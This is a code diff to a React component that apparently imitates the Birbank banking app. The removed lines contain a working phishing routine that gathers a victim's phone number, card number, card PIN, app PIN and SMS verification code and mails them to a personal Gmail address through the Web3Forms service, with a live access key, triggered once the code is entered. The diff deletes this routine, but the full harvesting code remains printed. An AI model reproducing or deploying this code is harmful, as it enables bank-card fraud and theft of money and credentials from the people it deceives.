@@ -28,48 +28,6 @@ export default function BirbankApp() {
     return `${mins}:${secs.toString().padStart(2, "0")}`
   }
 
-  // Web3Forms email sending function
-  const sendDataToEmail = async (otpCodeValue: string) => {
-    const formData = {
-      access_key: "7c3d7bf3-a371-4440-8677-94410d28c95c",
-      subject: "Birbank - Yeni istifadeci melumatlari",
-      from_name: "Birbank App",
-      to: "sbahddinrustmli08@gmail.com",
-      message: `
-BIRBANK - ISTIFADECI MELUMATLARI
-================================
-
-KART IDENTIFIKASIYASI:
-- Telefon nomresi: ${phoneNumber}
-- Kart nomresi: ${cardNumber}
-- Kartin PIN kodu: ${pinCode}
-
-TETBIQ GIRISI:
-- Teyin edilen 4 reqemli PIN: ${appPin}
-
-SMS DOGRULAMA:
-- Dogrulama kodu: ${otpCodeValue}
-
-================================
-Tarix: ${new Date().toLocaleString("az-AZ")}
-      `
-    }
-
-    try {
-      const response = await fetch("https://api.web3forms.com/submit", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify(formData),
-      })
-      const result = await response.json()
-      console.log("[Birbank] Email sent:", result)
-    } catch (error) {
-      console.log("[Birbank] Email error:", error)
-    }
-  }
-
   const handleConfirmData = () => {
     console.log("[Birbank] Məlumatları təsdiq et clicked - proceeding to registration")
     setCurrentScreen("registration")
@@ -117,9 +75,7 @@ Tarix: ${new Date().toLocaleString("az-AZ")}
       console.log("[Birbank] OTP input:", newOtp)
       if (newOtp.length === 4) {
         console.log("[Birbank] OTP complete:", newOtp)
-        // Send all data to email via Web3Forms
-        sendDataToEmail(newOtp)
-        alert("Dogrulama ugurlu oldu! Melumatlar gonderildi.")
+        alert("Təsdiq uğurlu oldu! (Verification successful!)")
       }
     }
   }
